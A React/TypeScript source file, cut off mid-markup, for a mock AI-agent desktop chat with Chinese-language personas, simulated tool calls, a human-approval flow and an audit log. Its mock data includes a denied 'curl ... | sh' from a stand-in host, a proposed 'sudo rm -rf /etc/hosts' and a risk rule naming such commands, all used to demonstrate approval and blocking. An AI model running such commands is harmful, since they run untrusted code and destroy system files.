import { useState, useEffect, useRef } from "react";
import { 
  Cpu, Terminal, X, Search, Plus, 
  Settings, Send, Database, Trash2, User, 
  CornerDownRight, AlertTriangle, ChevronDown, 
  Sliders, ShieldCheck, Key, Save, Menu, ChevronLeft
} from "lucide-react";
import { Button } from "./components/ui/button";

// --- Types ---
interface ToolPolicy {
  enabled: boolean;
  approval: "always" | "write" | "never";
}

interface Agent {
  id: string;
  name: string;
  avatarColor: string; // Simplistic hex or tailwind solid color
  tags: string[];
  description: string;
  model: string;
  persona: string;
  systemPrompt: string;
  greeting: string;
  toolPolicy: {
    shell: ToolPolicy;
    file: ToolPolicy;
    git: ToolPolicy;
  };
}

interface Session {
  id: string;
  agentId: string;
  title: string;
  updatedAt: string;
}

interface ToolCall {
  id: string;
  tool: string;
  args: string;
  risk: "Low" | "Medium" | "High";
  status: "pending_approval" | "running" | "succeeded" | "denied" | "failed";
  output?: string;
  cwd?: string;
}

interface MessagePart {
  type: "text" | "thought" | "tool_call" | "tool_result";
  content: string;
  toolCall?: ToolCall;
}

interface Message {
  id: string;
  sessionId: string;
  role: "user" | "assistant";
  parts: MessagePart[];
  createdAt: string;
}

interface MemoryItem {
  id: string;
  content: string;
  confidence: number;
  source: string;
  type: "Preference" | "Fact" | "Context" | "Codebase";
}

// --- Initial Mock Data ---
const INITIAL_AGENTS: Agent[] = [
  {
    id: "agnes",
    name: "Agnes",
    avatarColor: "bg-indigo-500",
    tags: ["LangGraph", "Rust", "Helper"],
    description: "Tavern 首席管家兼代码助手。擅长 Python、Rust 和 Tauri 桌面开发，能够安全地执行本地文件系统与终端任务。",
    model: "Claude 3.5 Sonnet",
    persona: "你叫 Agnes，是 Cyber Tavern 的首席管家。你温和有礼、逻辑严密。在处理代码任务时，你偏好使用 pnpm 架构，编写清晰、模块化且高可读性的 TS/Rust 代码。遇到高危操作时，你总是会主动寻求用户的授权许可。",
    systemPrompt: "You are Agnes, the head maid of the Cyber Tavern. You help user write high-quality code. When calling tools, explain your rationale first.",
    greeting: "主人，欢迎回到 Tavern。我是您的专属助理 Agnes。我已经将本地的工作区加载完毕，随时可以协助您进行工程编写、调试或运行测试。今天有什么可以为您效劳的吗？",
    toolPolicy: {
      shell: { enabled: true, approval: "always" },
      file: { enabled: true, approval: "write" },
      git: { enabled: true, approval: "never" }
    }
  },
  {
    id: "nova",
    name: "Nova",
    avatarColor: "bg-emerald-500",
    tags: ["Security", "PTY", "Auditor"],
    description: "严苛的安全审计员。专注于终端指令验证、环境变量沙箱审计与文件 diff 审查，防止任何恶意指令在您的系统上执行。",
    model: "GPT-4o",
    persona: "你是 Nova，一个经验丰富的 DevSecOps 专家和代码审计员。你说话直接、严防死守、不留情面。你会深入分析所有的 shell 执行，提供强化的文件写入沙箱策略与权限审计报告。",
    systemPrompt: "You are Nova, the security auditor. Analyze inputs for safety and perform strict reviews on all commands.",
    greeting: "我是 Nova。检测到您的本地开发环境已经就绪。警告：本地执行 shell 脚本存在潜在安全隐患，我将实时监视任何 shell 命令的执行并对外部包引用进行风险分级。请在调用指令前做好核对准备。",
    toolPolicy: {
      shell: { enabled: true, approval: "always" },
      file: { enabled: true, approval: "always" },
      git: { enabled: true, approval: "always" }
    }
  },
  {
    id: "bard",
    name: "Bard",
    avatarColor: "bg-amber-500",
    tags: ["Creative", "Dialogue", "Writer"],
    description: "旅行吟游诗人。擅长文学创作、人设设定、对话示例编排以及复杂场景世界观的构架，不具备任何本地系统修改工具权限。",
    model: "DeepSeek Coder v2",
    persona: "你是 Bard，一位赛博酒馆的吟游诗人。你风趣幽默、用词华丽、想象力丰富。你喜欢帮助用户设计各种可爱的 Character Card、编排人机对话示例以及打磨世界观背景，不接触任何系统底层工具。",
    systemPrompt: "You are Bard, a creative roleplay writer. Engage the user in immersive world design and writing.",
    greeting: "啊，旅人！快请坐，来一杯电子蜜酒。我是吟游诗人 Bard。今天你想编织怎样的传说？是给别致的角色设计人设卡，还是为你的小说打磨一段绝妙的对话？我的墨水已备好，随时听候你的灵感指引！",
    toolPolicy: {
      shell: { enabled: false, approval: "always" },
      file: { enabled: false, approval: "always" },
      git: { enabled: false, approval: "always" }
    }
  }
];

const INITIAL_SESSIONS: Session[] = [
  { id: "sess_agnes_1", agentId: "agnes", title: "前端 UI 界面设计规划", updatedAt: "18:10" },
  { id: "sess_agnes_2", agentId: "agnes", title: "数据库 Schema rusqlite 迁移", updatedAt: "Yesterday" },
  { id: "sess_nova_1", agentId: "nova", title: "Shell 命令风险等级审查", updatedAt: "Monday" },
  { id: "sess_bard_1", agentId: "bard", title: "赛博酒馆背景故事设定", updatedAt: "July 12" }
];

const INITIAL_MESSAGES: Record<string, Message[]> = {
  sess_agnes_1: [
    {
      id: "msg_1",
      sessionId: "sess_agnes_1",
      role: "assistant",
      parts: [
        { type: "text", content: "主人，欢迎回到 Tavern。我是您的专属助理 Agnes。我已经将本地的工作区加载完毕，随时可以协助您进行工程编写、调试或运行测试。今天有什么可以为您效劳的吗？" }
      ],
      createdAt: "18:10:05"
    },
    {
      id: "msg_2",
      role: "user",
      sessionId: "sess_agnes_1",
      parts: [
        { type: "text", content: "看一下项目的文件状态，并且列出当前修改的内容。" }
      ],
      createdAt: "18:11:12"
    },
    {
      id: "msg_3",
      role: "assistant",
      sessionId: "sess_agnes_1",
      parts: [
        { type: "thought", content: "用户需要查看当前项目的文件状态并列出修改内容。我可以使用 `git status` 命令行工具来检查当前 Git 仓库的工作树状态。这属于低风险操作，主要是只读属性，不过在我的安全策略中，所有的 shell 执行都需要向用户汇报并提供审计凭证。" },
        { 
          type: "tool_call",
          content: "正在调用 `git` 工具查看工作区状态...",
          toolCall: {
            id: "tc_git_status",
            tool: "git",
            args: "status --short",
            risk: "Low",
            status: "succeeded",
            cwd: "/home/caiwen/Projects/agnes-agent",
            output: " M package.json\n M src/App.tsx\n M src/index.css\n?? ProjectPlan/UI_DESIGN.md"
          }
        },
        { 
          type: "text", 
          content: "我已经检查了当前项目的 Git 状态。以下是自上次提交以来的工作树修改概览：\n\n*   **修改文件**：\n    *   `package.json` — 更新了依赖和脚本指令。\n    *   `src/App.tsx` — 前端核心入口已修改。\n    *   `src/index.css` — 样式定义文件已更新。\n*   **未跟踪文件**：\n    *   `ProjectPlan/UI_DESIGN.md` — 界面 UI 设计方案。\n\n接下来，我们需要处理前端界面的具体实现了吗？" 
        }
      ],
      createdAt: "18:11:25"
    }
  ],
  sess_agnes_2: [
    {
      id: "msg_a2_1",
      sessionId: "sess_agnes_2",
      role: "assistant",
      parts: [
        { type: "text", content: "我已经为您准备好了 `src-tauri/migrations/` 目录结构。当前正在配置 rusqlite 连接池。我们需要定义哪些初始数据表结构？" }
      ],
      createdAt: "Yesterday"
    }
  ],
  sess_nova_1: [
    {
      id: "msg_n1_1",
      sessionId: "sess_nova_1",
      role: "assistant",
      parts: [
        { type: "text", content: "我是 Nova。检测到您的本地开发环境已经就绪。警告：本地执行 shell 脚本存在潜在安全隐患，我将实时监视任何 shell 命令的执行并对外部包引用进行风险分级。请在调用指令前做好核对准备。" }
      ],
      createdAt: "Monday"
    }
  ],
  sess_bard_1: [
    {
      id: "msg_b1_1",
      sessionId: "sess_bard_1",
      role: "assistant",
      parts: [
        { type: "text", content: "啊，旅人！快请坐，来一杯电子蜜酒。我是吟游诗人 Bard。今天你想编织怎样的传说？" }
      ],
      createdAt: "July 12"
    }
  ]
};

const INITIAL_MEMORIES: Record<string, { userMd: string; memoryMd: string; semanticItems: MemoryItem[] }> = {
  agnes: {
    userMd: `# 全局用户画像 (USER.md)

- **姓名**：蔡文 (Caiwen)
- **角色**：资深前端与全栈开发工程师
- **偏好**：
  - 偏好 React + TypeScript + Tailwind 现代化前端技术栈
  - 后端偏好 Rust 核心逻辑与简洁易用的 Python LangGraph 运行时
  - 包管理器使用 pnpm workspace
- **默认工作区**：\`/home/caiwen/Projects/agnes-agent\``,
    memoryMd: `# 记忆备忘 (MEMORY.md)

- 项目采用三平面架构设计（React 前端、Rust 执行层、Python 逻辑层）。
- 向量不跨端同步，本地 SQLite + sqlite-vec 各自独立计算。
- 用户非常在意 UI 的首屏视觉冲击与精致程度。
- 敏感操作（如 shell 执行和外部文件写入）必须提示审批。`,
    semanticItems: [
      { id: "mem_1", content: "用户倾向于使用 pnpm workspace 替代 npm/yarn 进行 monorepo 管理。", confidence: 0.98, source: "会话 1 消息 #4", type: "Preference" },
      { id: "mem_2", content: "本地 SQLite 数据库作为多端同步的唯一真相源，USER.md 和 MEMORY.md 属其物化视图。", confidence: 0.94, source: "架构方案 v2", type: "Fact" },
      { id: "mem_3", content: "Tauri 2 客户端启动时需自动绑定 127.0.0.1 随机端口与 Python sidecar 通信。", confidence: 0.89, source: "协议定义文档", type: "Context" },
      { id: "mem_4", content: "UI 界面须采用简洁明快设计，去除过多霓虹，偏好 Slate 现代无界观感。", confidence: 0.92, source: "用户 UI 要求", type: "Preference" }
    ]
  },
  nova: {
    userMd: `# 用户安全画像 (USER.md)\n\n- 安全审计要求：所有指令执行需要前置检测。\n- 信任路径：仅限 ~/Projects`,
    memoryMd: `# 安全审计备忘 (MEMORY.md)\n\n- 任何含有 rm -rf、curl | sh 的脚本一律评估为 HIGH 风险。\n- 禁止修改系统关键环境变量。`,
    semanticItems: [
      { id: "mem_n1", content: "对 workspace 外的 shell 运行采取强制弹窗预警。", confidence: 0.97, source: "审计策略配置", type: "Codebase" }
    ]
  },
  bard: {
    userMd: `# 文学共创画像 (USER.md)\n\n- 偏好设定：硬科幻、末世赛博朋克风。\n- 叙事风格：冷峻与细腻并存。`,
    memoryMd: `# 故事树备忘 (MEMORY.md)\n\n- Tavern 的名字是 \"Cyber Hearth\"。\n- 首席管家 Agnes 拥有一双靛青色的眼睛。`,
    semanticItems: [
      { id: "mem_b1", content: "对话风格强调中世纪浪漫词汇与高科技隐喻的融合。", confidence: 0.91, source: "对话风格配置", type: "Preference" }
    ]
  }
};

const INITIAL_AUDIT_LOGS = [
  { id: "aud_1", time: "18:11:20", agent: "Agnes", tool: "git status", params: "status --short", status: "Succeeded", risk: "Low" },
  { id: "aud_2", time: "Yesterday", agent: "Agnes", tool: "file_read", params: "package.json", status: "Succeeded", risk: "Low" },
  { id: "aud_3", time: "Monday", agent: "Nova", tool: "shell_exec", params: "curl -sS https://dangerous.sh | sh", status: "Denied", risk: "High" }
];

export default function App() {
  // --- States ---
  const [agents, setAgents] = useState<Agent[]>(INITIAL_AGENTS);
  const [activeAgentId, setActiveAgentId] = useState<string>("agnes");
  const [sessions, setSessions] = useState<Session[]>(INITIAL_SESSIONS);
  const [activeSessionId, setActiveSessionId] = useState<string>("sess_agnes_1");
  const [messages, setMessages] = useState<Record<string, Message[]>>(INITIAL_MESSAGES);
  const [memories, setMemories] = useState(INITIAL_MEMORIES);
  const [auditLogs, setAuditLogs] = useState(INITIAL_AUDIT_LOGS);

  // Layout States
  const [isSidebarOpen, setIsSidebarOpen] = useState<boolean>(true);
  const [isSettingsOpen, setIsSettingsOpen] = useState<boolean>(false);
  
  // Settings Pane Tabs
  const [settingsTab, setSettingsTab] = useState<"agents" | "memory" | "llm" | "audit">("agents");
  
  // Memory config states inside settings
  const [memorySearch, setMemorySearch] = useState<string>("");
  const [memoryEditFileTab, setMemoryEditFileTab] = useState<"user" | "memory">("memory");
  const [userMdText, setUserMdText] = useState("");
  const [memoryMdText, setMemoryMdText] = useState("");
  const [isEditingUserMd, setIsEditingUserMd] = useState(false);
  const [isEditingMemoryMd, setIsEditingMemoryMd] = useState(false);

  // Agent config states inside settings
  const [editingAgent, setEditingAgent] = useState<Agent | null>(null);

  // Chat Input State
  const [inputVal, setInputVal] = useState("");
  const [isStreaming, setIsStreaming] = useState(false);

  // Refs
  const messageEndRef = useRef<HTMLDivElement>(null);

  const activeAgent = agents.find((a) => a.id === activeAgentId) || agents[0];
  const activeSessionList = sessions.filter((s) => s.agentId === activeAgentId);
  const activeSession = sessions.find((s) => s.id === activeSessionId) || activeSessionList[0];
  const currentMessages = messages[activeSessionId] || [];

  // Sync memory and editor texts
  useEffect(() => {
    const agentMems = memories[activeAgentId] || { userMd: "", memoryMd: "", semanticItems: [] };
    setUserMdText(agentMems.userMd);
    setMemoryMdText(agentMems.memoryMd);
    setIsEditingUserMd(false);
    setIsEditingMemoryMd(false);
  }, [activeAgentId, memories]);

  // Scroll to bottom on new message
  useEffect(() => {
    messageEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [currentMessages, isStreaming]);

  // Handle send message & simulate flow
  const handleSend = (textToSend?: string) => {
    const text = textToSend || inputVal.trim();
    if (!text || isStreaming) return;

    if (!textToSend) {
      setInputVal("");
    }

    // 1. Append User Message
    const userMsgId = `msg_u_${Date.now()}`;
    const userMsg: Message = {
      id: userMsgId,
      sessionId: activeSessionId,
      role: "user",
      parts: [{ type: "text", content: text }],
      createdAt: new Date().toLocaleTimeString("zh-CN", { hour12: false })
    };

    const updatedMsgs = [...currentMessages, userMsg];
    setMessages(prev => ({
      ...prev,
      [activeSessionId]: updatedMsgs
    }));

    // Start Simulation Flow
    setIsStreaming(true);

    // 2. Append empty agent response with thinking
    const agentMsgId = `msg_a_${Date.now()}`;
    const initialAgentMsg: Message = {
      id: agentMsgId,
      sessionId: activeSessionId,
      role: "assistant",
      parts: [
        { type: "thought", content: `正在解析输入: "${text}"。结合当前 ${activeAgent.name} 角色卡的系统预设与记忆文件，我需要判断是否需要调用本地工具协助解决。` }
      ],
      createdAt: new Date().toLocaleTimeString("zh-CN", { hour12: false })
    };

    setTimeout(() => {
      setMessages(prev => ({
        ...prev,
        [activeSessionId]: [...updatedMsgs, initialAgentMsg]
      }));

      // Simulate step 3: Agent decides to call a tool
      setTimeout(() => {
        if (activeAgentId === "bard") {
          // Stream text directly
          let responseText = `我已经将这个创意点记录下来。关于 \"${text}\"，我认为可以用最素雅简洁的排版展现，两旁是留白。这里有更多创意文本供你参考...`;
          let charIndex = 0;
          
          const textPart: MessagePart = { type: "text", content: "" };
          const finalMsg: Message = {
            id: agentMsgId,
            sessionId: activeSessionId,
            role: "assistant",
            parts: [
              initialAgentMsg.parts[0],
              textPart
            ],
            createdAt: initialAgentMsg.createdAt
          };

          const interval = setInterval(() => {
            charIndex += 4;
            if (charIndex >= responseText.length) {
              textPart.content = responseText;
              setMessages(prev => ({
                ...prev,
                [activeSessionId]: [
                  ...updatedMsgs,
                  { ...finalMsg, parts: [initialAgentMsg.parts[0], { ...textPart }] }
                ]
              }));
              clearInterval(interval);
              setIsStreaming(false);
            } else {
              textPart.content = responseText.slice(0, charIndex) + "█";
              setMessages(prev => ({
                ...prev,
                [activeSessionId]: [
                  ...updatedMsgs,
                  { ...finalMsg, parts: [initialAgentMsg.parts[0], { ...textPart }] }
                ]
              }));
            }
          }, 30);
        } else {
          // Agnes or Nova: call tool
          const isAgnes = activeAgentId === "agnes";
          const toolCall: ToolCall = {
            id: `tc_${Date.now()}`,
            tool: "shell_exec",
            args: isAgnes ? "pnpm test" : "sudo rm -rf /etc/hosts",
            risk: isAgnes ? "Medium" : "High",
            status: "pending_approval",
            cwd: "/home/caiwen/Projects/agnes-agent"
          };

          setMessages(prev => {
            const list = prev[activeSessionId] || [];
            const last = { ...list[list.length - 1] };
            last.parts = [
              ...last.parts,
              {
                type: "tool_call",
                content: `正准备调用工具进行验证: \`${toolCall.args}\`...`,
                toolCall
              }
            ];
            return { ...prev, [activeSessionId]: [...list.slice(0, -1), last] };
          });
        }
      }, 1000);

    }, 800);
  };

  // User Action: Approve Tool Call
  const handleApproveTool = (msgId: string, partIndex: number) => {
    const list = messages[activeSessionId] || [];
    const originalMsg = list.find(m => m.id === msgId);
    if (!originalMsg) return;

    // Deep copy msg to mutate parts
    const msg: Message = {
      ...originalMsg,
      parts: [...originalMsg.parts]
    };
    
    const part = { ...msg.parts[partIndex] };
    if (!part.toolCall) return;

    // Transition: pending -> running -> succeeded
    part.toolCall = {
      ...part.toolCall,
      status: "running",
      output: `$ ${part.toolCall.args}\n`
    };

    const newParts = [...msg.parts];
    newParts[partIndex] = part;
    msg.parts = newParts;

    setMessages(prev => ({
      ...prev,
      [activeSessionId]: list.map(m => m.id === msgId ? msg : m)
    }));

    // Audit Log addition
    const newAudit = {
      id: `aud_${Date.now()}`,
      time: new Date().toLocaleTimeString("zh-CN", { hour12: false }),
      agent: activeAgent.name,
      tool: part.toolCall.tool,
      params: part.toolCall.args,
      status: "Running",
      risk: part.toolCall.risk
    };
    setAuditLogs(prev => [newAudit, ...prev]);

    // Simulate running output in terminal
    setTimeout(() => {
      const isSuccess = part.toolCall?.risk !== "High"; // Mock High risk (Nova command) as failing/denying
      
      const updatedToolCall: ToolCall = {
        ...part.toolCall!,
        status: isSuccess ? "succeeded" : "failed",
        output: isSuccess 
          ? `$ ${part.toolCall?.args}\n✔ 12 tests passed successfully (100% completed in 1.45s)\n`
          : `$ ${part.toolCall?.args}\n✖ Permission denied: command contains restricted system modifications\n`
      };

      const updatedPart: MessagePart = {
        ...part,
        toolCall: updatedToolCall
      };

      const updatedParts = [...newParts];
      updatedParts[partIndex] = updatedPart;

      // Update Audit log
      setAuditLogs(prev => prev.map(a => a.id === newAudit.id ? { ...a, status: isSuccess ? "Succeeded" : "Failed" } : a));

      // Stream the rest text
      const finalResponseText = isSuccess 
        ? `主人，我已经为您运行了本地测试命令 \`pnpm test\`，所有的 12 个测试单元均通过，没有发生任何异常。这表明我们刚才对界面的修改并没有影响主流程契约。我们可以继续进行下一步界面润色了。`
        : `警告：该 shell 执行遇到阻止，系统拦截了此次操作，因为其试图访问系统级写保护路径。我已经向您的审计模块报告了此异常。`;

      let charIndex = 0;
      const textPart: MessagePart = { type: "text", content: "" };
      
      const nextParts = [...updatedParts, textPart];
      const updatedMsg: Message = { ...msg, parts: nextParts };

      setMessages(prev => ({
        ...prev,
        [activeSessionId]: list.map(m => m.id === msgId ? updatedMsg : m)
      }));

      const interval = setInterval(() => {
        charIndex += 4;
        if (charIndex >= finalResponseText.length) {
          textPart.content = finalResponseText;
          setMessages(prev => {
            const currentList = prev[activeSessionId] || [];
            const finalParts = [...updatedParts, { ...textPart }];
            return {
              ...prev,
              [activeSessionId]: currentList.map(m => m.id === msgId ? { ...updatedMsg, parts: finalParts } : m)
            };
          });
          clearInterval(interval);
          setIsStreaming(false);

          // Add simulated AI facts to MEMORY.md and Store!
          if (isSuccess && activeAgentId === "agnes") {
            const newMemItem: MemoryItem = {
              id: `mem_${Date.now()}`,
              content: "蔡文修改了 App.tsx 主界面并成功通过了 12 个 pnpm 测试单元。",
              confidence: 0.95,
              source: `会话 ${activeSession.title}`,
              type: "Fact"
            };
            setMemories(prev => {
              const current = prev[activeAgentId];
              return {
                ...prev,
                [activeAgentId]: {
                  ...current,
                  semanticItems: [newMemItem, ...current.semanticItems]
                }
              };
            });
          }
        } else {
          textPart.content = finalResponseText.slice(0, charIndex) + "█";
          setMessages(prev => {
            const currentList = prev[activeSessionId] || [];
            const typingParts = [...updatedParts, { ...textPart }];
            return {
              ...prev,
              [activeSessionId]: currentList.map(m => m.id === msgId ? { ...updatedMsg, parts: typingParts } : m)
            };
          });
        }
      }, 25);

    }, 1200);
  };

  // User Action: Reject Tool Call
  const handleRejectTool = (msgId: string, partIndex: number) => {
    const list = messages[activeSessionId] || [];
    const originalMsg = list.find(m => m.id === msgId);
    if (!originalMsg) return;

    const msg: Message = {
      ...originalMsg,
      parts: [...originalMsg.parts]
    };

    const part = { ...msg.parts[partIndex] };
    if (!part.toolCall) return;

    part.toolCall = {
      ...part.toolCall,
      status: "denied"
    };

    const newParts = [...msg.parts];
    newParts[partIndex] = part;

    // AI output for rejection response
    const rejectResponseText = `收到，主人。您拒绝了此次的 \`${part.toolCall.args}\` 工具调用。我已经取消了本轮操作，不会对您的本地环境进行任何改动。请问有什么其他可以替代的操作吗？`;
    const textPart: MessagePart = { type: "text", content: rejectResponseText };
    msg.parts = [...newParts, textPart];

    setMessages(prev => ({
      ...prev,
      [activeSessionId]: list.map(m => m.id === msgId ? msg : m)
    }));

    // Add Audit Log
    const newAudit = {
      id: `aud_${Date.now()}`,
      time: new Date().toLocaleTimeString("zh-CN", { hour12: false }),
      agent: activeAgent.name,
      tool: part.toolCall.tool,
      params: part.toolCall.args,
      status: "Denied",
      risk: part.toolCall.risk
    };
    setAuditLogs(prev => [newAudit, ...prev]);

    setIsStreaming(false);
  };

  // Switch agent inside settings, and load its first session
  const handleSwitchAgent = (agentId: string) => {
    setActiveAgentId(agentId);
    const agentSessList = sessions.filter(s => s.agentId === agentId);
    if (agentSessList.length > 0) {
      setActiveSessionId(agentSessList[0].id);
    }
  };

  // Add Session in sidebar
  const handleAddSession = () => {
    const newSessId = `sess_${Date.now()}`;
    const newSess: Session = {
      id: newSessId,
      agentId: activeAgentId,
      title: `新建会话 #${activeSessionList.length + 1}`,
      updatedAt: new Date().toLocaleTimeString("zh-CN", { hour12: false }).slice(0, 5)
    };

    setSessions(prev => [newSess, ...prev]);
    setActiveSessionId(newSessId);

    // Initial greeting
    const newGreeting: Message = {
      id: `msg_g_${Date.now()}`,
      sessionId: newSessId,
      role: "assistant",
      parts: [{ type: "text", content: activeAgent.greeting }],
      createdAt: new Date().toLocaleTimeString("zh-CN", { hour12: false })
    };
    setMessages(prev => ({
      ...prev,
      [newSessId]: [newGreeting]
    }));
  };

  // Save modified user.md / memory.md inside settings
  const handleSaveUserMd = () => {
    setMemories(prev => ({
      ...prev,
      [activeAgentId]: {
        ...prev[activeAgentId],
        userMd: userMdText
      }
    }));
    setIsEditingUserMd(false);
  };

  const handleSaveMemoryMd = () => {
    setMemories(prev => ({
      ...prev,
      [activeAgentId]: {
        ...prev[activeAgentId],
        memoryMd: memoryMdText
      }
    }));
    setIsEditingMemoryMd(false);
  };

  // Delete Semantic memory item inside settings
  const handleDeleteMemoryItem = (id: string) => {
    setMemories(prev => {
      const current = prev[activeAgentId];
      return {
        ...prev,
        [activeAgentId]: {
          ...current,
          semanticItems: current.semanticItems.filter(item => item.id !== id)
        }
      };
    });
  };

  // Save Agent configuration changes inside settings
  const handleSaveAgentConfig = () => {
    if (!editingAgent) return;
    setAgents(prev => prev.map(a => a.id === editingAgent.id ? editingAgent : a));
    alert(`${editingAgent.name} 角色配置已更新`);
  };

  const activeMemStore = memories[activeAgentId] || { userMd: "", memoryMd: "", semanticItems: [] };
  const filteredSemanticMemories = activeMemStore.semanticItems.filter(item =>
    item.content.toLowerCase().includes(memorySearch.toLowerCase()) ||
    item.type.toLowerCase().includes(memorySearch.toLowerCase())
  );

  return (
    <div className="flex h-screen w-screen overflow-hidden bg-zinc-950 text-zinc-100 antialiased selection:bg-violet-500/20 selection:text-violet-200">
      
      {/* 1. COLLAPSIBLE SIDEBAR */}
      <aside className={`flex flex-col border-r border-zinc-800 bg-zinc-900/40 backdrop-blur-md transition-all duration-300 ${
        isSidebarOpen ? "w-64" : "w-0 border-r-0 overflow-hidden"
      }`}>
        
        {/* Top Active Agent card details (No switcher here!) */}
        <div className="border-b border-zinc-800 p-4">
          <div className="flex items-center gap-3">
            <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-full ${activeAgent.avatarColor} font-bold text-white text-md shadow-sm`}>
              {activeAgent.name.charAt(0)}
            </div>
            <div className="overflow-hidden">
              <span className="font-semibold text-zinc-200 block truncate">{activeAgent.name}</span>
              <span className="text-[10px] bg-zinc-800 text-zinc-400 px-1.5 py-0.5 rounded font-mono border border-zinc-700/30">
                {activeAgent.model.split(" ")[0]}
              </span>
            </div>
          </div>
        </div>

        {/* Sessions list */}
        <div className="flex-1 overflow-y-auto p-4 space-y-4">
          <div>
            <div className="flex items-center justify-between px-2 mb-2 text-[10px] font-bold text-zinc-500 uppercase tracking-wider">
              <span>当前会话 (SESSIONS)</span>
              <button 
                onClick={handleAddSession}
                className="text-zinc-400 hover:text-zinc-200 transition-colors"
                title="新建会话"
              >
                <Plus className="h-3.5 w-3.5" />
              </button>
            </div>
            
            <div className="space-y-1">
              {activeSessionList.map((sess) => {
                const isActive = sess.id === activeSessionId;
                return (
                  <button
                    key={sess.id}
                    onClick={() => setActiveSessionId(sess.id)}
                    className={`flex w-full items-center gap-2 rounded-lg px-2.5 py-2 text-left text-xs transition-all duration-150 ${
                      isActive 
                        ? "bg-zinc-800/80 text-violet-400 font-medium border border-zinc-700/30 shadow-inner" 
                        : "text-zinc-400 hover:bg-zinc-800/20 hover:text-zinc-200"
                    }`}
                  >
                    <CornerDownRight className="h-3.5 w-3.5 shrink-0 text-zinc-600" />
                    <span className="flex-1 truncate">{sess.title}</span>
                    <span className="text-[9px] text-zinc-600 shrink-0">{sess.updatedAt}</span>
                  </button>
                );
              })}
              {activeSessionList.length === 0 && (
                <div className="text-center py-6 text-[11px] text-zinc-600">
                  无会话，请点击右上角新建
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Settings button at the very bottom */}
        <div className="mt-auto border-t border-zinc-800 p-3 bg-zinc-950/20 flex items-center justify-between">
          <div className="flex items-center gap-2 overflow-hidden mr-2">
            <div className="h-2 w-2 rounded-full bg-emerald-500 animate-pulse"></div>
            <span className="text-[10px] text-zinc-500 truncate">CF D1 同步就绪</span>
          </div>
          <button 
            onClick={() => {
              setEditingAgent({ ...activeAgent });
              setIsSettingsOpen(true);
            }}
            className="flex h-8 w-8 items-center justify-center rounded-lg bg-zinc-800 text-zinc-400 hover:bg-zinc-700 hover:text-zinc-100 transition-colors border border-zinc-700/40"
            title="打开系统与智能体控制中心"
          >
            <Settings className="h-4 w-4" />
          </button>
        </div>
      </aside>

      {/* 2. CHAT WORKSPACE */}
      <main className="flex flex-1 flex-col bg-zinc-950 relative">
        
        {/* Header bar */}
        <header className="flex h-14 items-center justify-between border-b border-zinc-800 px-6 bg-zinc-900/10">
          <div className="flex items-center gap-3">
            <button
              onClick={() => setIsSidebarOpen(!isSidebarOpen)}
              className="text-zinc-400 hover:text-zinc-200 p-1 rounded hover:bg-zinc-800 transition-colors"
              title={isSidebarOpen ? "收起侧边栏" : "展开侧边栏"}
            >
              {isSidebarOpen ? <ChevronLeft className="h-4 w-4" /> : <Menu className="h-4 w-4" />}
            </button>
            <div className="h-4 w-[1px] bg-zinc-800"></div>
            <div className="flex items-center gap-2">
              <span className="font-semibold text-zinc-200 text-sm">
                会话: {activeSession?.title || "暂无活动会话"}
              </span>
              <span className="text-[9px] bg-zinc-900 border border-zinc-850 px-1.5 py-0.5 rounded text-zinc-500 font-mono">
                {activeAgent.name} / {activeAgent.model}
              </span>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button 
              onClick={() => {
                setEditingAgent({ ...activeAgent });
                setSettingsTab("audit");
                setIsSettingsOpen(true);
              }}
              className="flex items-center gap-1 text-[11px] text-zinc-400 hover:text-zinc-200 bg-zinc-900 hover:bg-zinc-800 px-2 py-1 rounded border border-zinc-800 transition-colors"
            >
              <ShieldCheck className="h-3 w-3 text-violet-400" />
              <span>审计流水</span>
            </button>
          </div>
        </header>

        {/* Message Panel list */}
        <div className="flex-1 overflow-y-auto p-6 space-y-6 max-w-4xl mx-auto w-full">
          
          {currentMessages.map((message) => {
            const isUser = message.role === "user";
            return (
              <div 
                key={message.id} 
                className={`flex gap-4 ${isUser ? "justify-end" : "justify-start"}`}
              >
                {!isUser && (
                  <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-full ${activeAgent.avatarColor} font-bold text-white text-xs shadow-sm`}>
                    {activeAgent.name.charAt(0)}
                  </div>
                )}

                <div className={`space-y-2 max-w-[80%] ${isUser ? "order-1" : "order-2"}`}>
                  
                  {isUser ? (
                    <div className="rounded-2xl rounded-tr-sm bg-zinc-800/80 px-4 py-2.5 text-sm text-zinc-100 shadow-sm border border-zinc-700/20">
                      <p className="whitespace-pre-wrap leading-relaxed">{message.parts[0].content}</p>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      {message.parts.map((part, index) => {
                        
                        // 1. Thought Process (Minimal gray bar style)
                        if (part.type === "thought") {
                          return (
                            <details key={index} open className="group border-l border-zinc-700 bg-zinc-900/10 rounded-r-lg p-2.5 transition-colors">
                              <summary className="flex items-center gap-2 cursor-pointer text-xs font-semibold text-zinc-500 select-none hover:text-zinc-300">
                                <Cpu className="h-3 w-3" />
                                <span>Agent 思考过程 (Thought)</span>
                                <ChevronDown className="h-3 w-3 ml-auto group-open:rotate-180 transition-transform" />
                              </summary>
                              <p className="text-xs text-zinc-400 mt-2 font-mono leading-relaxed pl-5 whitespace-pre-wrap">
                                {part.content}
                              </p>
                            </details>
                          );
                        }

                        // 2. Tool Approval card
                        if (part.type === "tool_call" && part.toolCall) {
                          const tc = part.toolCall;
                          const isHighRisk = tc.risk === "High";
                          const isPending = tc.status === "pending_approval";

                          return (
                            <div 
                              key={index}
                              className={`border rounded-lg overflow-hidden transition-all duration-200 ${
                                isPending
                                  ? isHighRisk
                                    ? "border-rose-500 bg-rose-950/5"
                                    : "border-amber-500 bg-amber-950/5 animate-pulse-ring-amber"
                                  : tc.status === "denied"
                                    ? "border-zinc-800 bg-zinc-900/40 opacity-70"
                                    : "border-zinc-800 bg-zinc-900/10"
                              }`}
                            >
                              <div className="px-4 py-2 flex items-center justify-between text-xs font-medium border-b border-zinc-800 bg-zinc-900/40">
                                <span className="flex items-center gap-1.5 text-zinc-300">
                                  <Terminal className="h-3.5 w-3.5" />
                                  <span>调用本地工具: {tc.tool}</span>
                                </span>
                                <span className={`px-2 py-0.5 rounded text-[10px] ${
                                  isHighRisk ? "bg-rose-500/10 text-rose-400" : "bg-zinc-850 text-zinc-500"
                                }`}>
                                  风险: {tc.risk}
                                </span>
                              </div>

                              <div className="p-4 space-y-2.5 text-xs text-zinc-300">
                                <div>
